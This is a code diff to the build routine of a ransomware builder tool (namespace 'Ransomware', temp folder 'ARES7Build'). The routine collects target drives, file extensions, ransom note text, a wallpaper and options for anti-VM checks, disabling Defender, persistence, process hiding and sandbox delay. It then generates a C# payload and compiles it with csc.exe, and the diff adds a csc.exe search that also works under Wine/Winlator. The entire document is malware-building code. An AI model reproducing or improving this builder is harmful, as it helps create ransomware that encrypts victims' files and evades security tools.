@@ -1069,136 +1069,203 @@ namespace Ransomware
         // ОСНОВНАЯ ЛОГИКА СБОРКИ
         // ============================================================
         private void BtnBuild_Click(object sender, EventArgs e)
+{
+    try
+    {
+        lblStatus.Text = "STARTING BUILD...";
+        lblStatus.ForeColor = yellowColor;
+        progressBar.Visible = true;
+        btnBuild.Enabled = false;
+        
+        string algorithm = cbAlgorithm.SelectedItem?.ToString() ?? "AES-256";
+        int algoValue = algorithm == "AES-256" ? 0 : algorithm == "Salsa20" ? 1 : 2;
+        
+        List<string> selectedDrives = new List<string>();
+        if (chkC.Checked) selectedDrives.Add("C:\\");
+        if (chkD.Checked) selectedDrives.Add("D:\\");
+        if (chkE.Checked) selectedDrives.Add("E:\\");
+        if (chkZ.Checked) selectedDrives.Add("Z:\\");
+        
+        if (selectedDrives.Count == 0)
+        {
+            MessageBox.Show("Select at least one drive!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            btnBuild.Enabled = true;
+            progressBar.Visible = false;
+            lblStatus.Text = "ERROR: select drive";
+            lblStatus.ForeColor = errorColor;
+            return;
+        }
+        
+        List<string> selectedExts = GetSelectedExtensions();
+        string encryptedExt = txtEncryptedExt.Text;
+        string noteName = txtNoteName.Text;
+        string noteContent = txtNoteContent.Text;
+        string outputName = txtOutputName.Text;
+        string outputPath = txtOutputPath.Text;
+        
+        string wallpaperBase64 = "";
+        string wallpaperExt = ".jpg";
+        if (!string.IsNullOrEmpty(wallpaperPath) && File.Exists(wallpaperPath))
+        {
+            byte[] imageData = File.ReadAllBytes(wallpaperPath);
+            wallpaperExt = Path.GetExtension(wallpaperPath);
+            if (string.IsNullOrEmpty(wallpaperExt)) wallpaperExt = ".jpg";
+            wallpaperBase64 = Convert.ToBase64String(imageData);
+        }
+        
+        lblDetail.Text = "Generating C# code...";
+        
+        string code = GenerateCSharpCode(
+            string.Join("|", selectedDrives),
+            string.Join("|", selectedExts),
+            txtExcludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"),
+            txtIncludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"),
+            encryptedExt,
+            noteName,
+            noteContent,
+            txtFakeProcessName.Text,
+            algoValue,
+            chkFakeProcess.Checked ? 1 : 0,
+            chkHideProcess.Checked ? 1 : 0,
+            chkAntiVM.Checked ? 1 : 0,
+            chkDisableDefender.Checked ? 1 : 0,
+            chkAddPersistence.Checked ? 1 : 0,
+            chkHideFilesAttr.Checked ? 1 : 0,
+            chkSandboxDelay.Checked ? 1 : 0,
+            wallpaperBase64,
+            wallpaperExt
+        );
+        
+        string tempDir = Path.Combine(Path.GetTempPath(), "ARES7Build");
+        if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);
+        
+        string csPath = Path.Combine(tempDir, "ransomware.cs");
+        File.WriteAllText(csPath, code, Encoding.UTF8);
+        
+        lblDetail.Text = "Looking for csc.exe...";
+        
+        // ============================================================
+        // ПОИСК CSC.EXE (РАБОТАЕТ В WINLATOR И WINDOWS)
+        // ============================================================
+        string cscPath = null;
+        string[] possiblePaths = {
+            // Windows
+            @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
+            @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
+            // Winlator / Wine (стандартные пути)
+            @"C:\windows\microsoft.net\framework\v4.0.30319\csc.exe",
+            @"C:\windows\microsoft.net\framework64\v4.0.30319\csc.exe",
+            // Wine (через Z:)
+            @"Z:\usr\lib\mono\4.5\csc.exe",
+            @"Z:\usr\lib\mono\4.8\csc.exe",
+            // Ищем в PATH
+            "csc.exe"
+        };
+        
+        foreach (string path in possiblePaths)
+        {
+            if (File.Exists(path))
+            {
+                cscPath = path;
+                break;
+            }
+        }
+        
+        // Если не нашли — пробуем через where
+        if (cscPath == null)
         {
             try
             {
-                lblStatus.Text = "STARTING BUILD...";
-                lblStatus.ForeColor = yellowColor;
-                progressBar.Visible = true;
-                btnBuild.Enabled = false;
+                ProcessStartInfo wherePsi = new ProcessStartInfo();
+                wherePsi.FileName = "where";
+                wherePsi.Arguments = "csc";
+                wherePsi.UseShellExecute = false;
+                wherePsi.RedirectStandardOutput = true;
+                wherePsi.CreateNoWindow = true;
                 
-                string algorithm = cbAlgorithm.SelectedItem?.ToString() ?? "AES-256";
-                int algoValue = algorithm == "AES-256" ? 0 : algorithm == "Salsa20" ? 1 : 2;
+                Process whereProcess = Process.Start(wherePsi);
+                string result = whereProcess.StandardOutput.ReadToEnd();
+                whereProcess.WaitForExit();
                 
-                List<string> selectedDrives = new List<string>();
-                if (chkC.Checked) selectedDrives.Add("C:\\");
-                if (chkD.Checked) selectedDrives.Add("D:\\");
-                if (chkE.Checked) selectedDrives.Add("E:\\");
-                if (chkZ.Checked) selectedDrives.Add("Z:\\");
-                
-                if (selectedDrives.Count == 0)
+                if (!string.IsNullOrEmpty(result))
                 {
-                    MessageBox.Show("Select at least one drive!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    btnBuild.Enabled = true;
-                    progressBar.Visible = false;
-                    lblStatus.Text = "ERROR: select drive";
-                    lblStatus.ForeColor = errorColor;
-                    return;
+                    cscPath = result.Trim().Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)[0];
                 }
-                
-                List<string> selectedExts = GetSelectedExtensions();
-                string encryptedExt = txtEncryptedExt.Text;
-                string noteName = txtNoteName.Text;
-                string noteContent = txtNoteContent.Text;
-                string outputName = txtOutputName.Text;
-                string outputPath = txtOutputPath.Text;
-                
-                string wallpaperBase64 = "";
-                string wallpaperExt = ".jpg";
-                if (!string.IsNullOrEmpty(wallpaperPath) && File.Exists(wallpaperPath))
-                {
-                    byte[] imageData = File.ReadAllBytes(wallpaperPath);
-                    wallpaperExt = Path.GetExtension(wallpaperPath);
-                    if (string.IsNullOrEmpty(wallpaperExt)) wallpaperExt = ".jpg";
-                    wallpaperBase64 = Convert.ToBase64String(imageData);
-                }
-                
-                lblDetail.Text = "Generating C# code...";
-                
-                string code = GenerateCSharpCode(
-                    string.Join("|", selectedDrives),
-                    string.Join("|", selectedExts),
-                    txtExcludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"),
-                    txtIncludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"),
-                    encryptedExt,
-                    noteName,
-                    noteContent,
-                    txtFakeProcessName.Text,
-                    algoValue,
-                    chkFakeProcess.Checked ? 1 : 0,
-                    chkHideProcess.Checked ? 1 : 0,
-                    chkAntiVM.Checked ? 1 : 0,
-                    chkDisableDefender.Checked ? 1 : 0,
-                    chkAddPersistence.Checked ? 1 : 0,
-                    chkHideFilesAttr.Checked ? 1 : 0,
-                    chkSandboxDelay.Checked ? 1 : 0,
-                    wallpaperBase64,
-                    wallpaperExt
-                );
-                
-                string tempDir = Path.Combine(Path.GetTempPath(), "ARES7Build");
-                if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);
-                
-                string csPath = Path.Combine(tempDir, "ransomware.cs");
-                File.WriteAllText(csPath, code, Encoding.UTF8);
-                
-                lblDetail.Text = "Compiling with csc.exe...";
-                
-                // Компилируем через csc.exe
-                ProcessStartInfo psi = new ProcessStartInfo();
-                psi.FileName = "csc.exe";
-                psi.Arguments = $"/target:winexe /out:\"{outputName}\" \"{csPath}\"";
-                psi.WorkingDirectory = outputPath;
-                psi.UseShellExecute = false;
-                psi.RedirectStandardOutput = true;
-                psi.RedirectStandardError = true;
-                psi.CreateNoWindow = true;
-                
-                Process process = Process.Start(psi);
-                string output = process.StandardOutput.ReadToEnd();
-                string error = process.StandardError.ReadToEnd();
-                process.WaitForExit();
-                
-                string finalPath = Path.Combine(outputPath, outputName);
-                if (File.Exists(finalPath) && new FileInfo(finalPath).Length > 10000)
-                {
-                    lblStatus.Text = "SUCCESS!";
-                    lblStatus.ForeColor = successColor;
-                    long sizeKB = new FileInfo(finalPath).Length / 1024;
-                    lblDetail.Text = $"{finalPath} | Size: {sizeKB} KB";
-                    
-                    if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
-                    {
-                        string destIcon = Path.Combine(outputPath, Path.GetFileName(iconPath));
-                        if (File.Exists(destIcon)) File.Delete(destIcon);
-                        File.Copy(iconPath, destIcon, true);
-                    }
-                    
-                    MessageBox.Show($"File compiled successfully!\n\n{finalPath}\n\nSize: {sizeKB} KB", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                }
-                else
-                {
-                    string errorMsg = "Compilation failed!\n\n" + error + "\n" + output;
-                    MessageBox.Show(errorMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    lblStatus.Text = "ERROR: compilation failed";
-                    lblStatus.ForeColor = errorColor;
-                    lblDetail.Text = "Check output for details";
-                }
-                
-                try { File.Delete(csPath); } catch { }
             }
-            catch (Exception ex)
-            {
-                lblStatus.Text = "ERROR!";
-                lblStatus.ForeColor = errorColor;
-                lblDetail.Text = ex.Message;
-                MessageBox.Show($"Error: {ex.Message}\n\n{ex.StackTrace}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
-            finally
-            {
-                btnBuild.Enabled = true;
-                progressBar.Visible = false;
-            }
+            catch { }
         }
+        
+        if (cscPath == null)
+        {
+            MessageBox.Show(
+                "csc.exe not found!\n\n" +
+                "Please install .NET Framework or Mono.\n\n" +
+                "For Winlator: install dotnet48 via WineTricks.",
+                "Error",
+                MessageBoxButtons.OK,
+                MessageBoxIcon.Error
+            );
+            btnBuild.Enabled = true;
+            progressBar.Visible = false;
+            lblStatus.Text = "ERROR: csc.exe not found";
+            lblStatus.ForeColor = errorColor;
+            return;
+        }
+        
+        lblDetail.Text = $"Compiling with {cscPath}...";
+        
+        ProcessStartInfo psi = new ProcessStartInfo();
+        psi.FileName = cscPath;
+        psi.Arguments = $"/target:winexe /out:\"{outputName}\" \"{csPath}\"";
+        psi.WorkingDirectory = outputPath;
+        psi.UseShellExecute = false;
+        psi.RedirectStandardOutput = true;
+        psi.RedirectStandardError = true;
+        psi.CreateNoWindow = true;
+        
+        Process process = Process.Start(psi);
+        string output = process.StandardOutput.ReadToEnd();
+        string error = process.StandardError.ReadToEnd();
+        process.WaitForExit();
+        
+        string finalPath = Path.Combine(outputPath, outputName);
+        if (File.Exists(finalPath) && new FileInfo(finalPath).Length > 10000)
+        {
+            lblStatus.Text = "SUCCESS!";
+            lblStatus.ForeColor = successColor;
+            long sizeKB = new FileInfo(finalPath).Length / 1024;
+            lblDetail.Text = $"{finalPath} | Size: {sizeKB} KB";
+            
+            if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
+            {
+                string destIcon = Path.Combine(outputPath, Path.GetFileName(iconPath));
+                if (File.Exists(destIcon)) File.Delete(destIcon);
+                File.Copy(iconPath, destIcon, true);
+            }
+            
+            MessageBox.Show($"File compiled successfully!\n\n{finalPath}\n\nSize: {sizeKB} KB", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+        else
+        {
+            string errorMsg = "Compilation failed!\n\n" + error + "\n" + output;
+            MessageBox.Show(errorMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            lblStatus.Text = "ERROR: compilation failed";
+            lblStatus.ForeColor = errorColor;
+            lblDetail.Text = "Check output for details";
+        }
+        
+        try { File.Delete(csPath); } catch { }
+    }
+    catch (Exception ex)
+    {
+        lblStatus.Text = "ERROR!";
+        lblStatus.ForeColor = errorColor;
+        lblDetail.Text = ex.Message;
+        MessageBox.Show($"Error: {ex.Message}\n\n{ex.StackTrace}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+    }
+    finally
+    {
+        btnBuild.Enabled = true;
+        progressBar.Visible = false;
     }
 }
